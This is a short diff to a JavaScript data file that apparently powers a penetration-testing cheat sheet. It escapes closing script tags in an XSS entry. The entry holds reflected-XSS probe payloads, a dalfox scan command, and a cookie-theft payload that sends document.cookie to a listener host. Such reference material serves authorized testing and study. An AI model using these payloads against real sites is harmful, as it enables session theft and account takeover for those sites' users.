@@ -602,9 +602,9 @@ const DATA=[
   {id:"xss", port:"WEB", svc:"injection", title:"XSS (Cross-Site Scripting)",
    notes:["Reflected / stored / DOM. Probe, then escalate to cookie theft or actions."],
    steps:[
-     {needs:[], t:"Quick probe (reflected)", c:"<script>alert(document.domain)</script>\n\"><img src=x onerror=alert(1)>"},
+     {needs:[], t:"Quick probe (reflected)", c:"<script>alert(document.domain)<\/script>\n\"><img src=x onerror=alert(1)>"},
      {needs:[], t:"Automated scan (dalfox)", c:"dalfox url \"{URL}/search?q=test\""},
-     {needs:[], t:"Cookie theft (out-of-band)", c:"<script>new Image().src='http://<listener_ip>/c='+document.cookie</script>"},
+     {needs:[], t:"Cookie theft (out-of-band)", c:"<script>new Image().src='http://<listener_ip>/c='+document.cookie<\/script>"},
    ]},
   {id:"lfi", port:"WEB", svc:"inclusion", title:"LFI / Path Traversal",
    notes:["<b>-mc</b> match the code, <b>-fs</b> filter by size."],
